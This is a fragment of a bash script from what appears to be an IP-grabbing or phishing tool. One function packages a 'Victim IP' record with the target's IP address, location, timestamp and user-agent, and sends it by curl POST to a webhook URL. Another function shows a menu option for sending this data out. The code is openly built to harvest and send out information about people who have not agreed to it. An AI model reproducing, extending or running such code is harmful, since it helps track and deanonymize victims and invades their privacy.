...
send_to_webhook() {
    ...
    if [[ -n "$ip" && -n "$location" && -n "$ua" ]]; then
        embed='{"embeds":[{"title":"Victim IP","description":"IP: '$ip'\nLocation: '$location'\nTime: '$current_time'\nUser-Agent: '$ua'"}]}'
        curl -X POST -H "Content-Type: application/json" -d "$embed" "$webhook_url"
    fi
}
...
start_with_webhook() {
    ...
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Send IP and info to Webhook\e[0m\n"
    default_option_webhook="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an Option (Default: 01): \e[0m\en' option_webhook
    option_webhook="${option_webhook:-${default_option_webhook}}"
    if [[ $option_webhook == "01" || $option_webhook == "1" ]]; then
        send_to_webhook
    else
        printf "\e[1;93mSkipping sending IP and info to webhook.\e[0m\n"
    fi
}
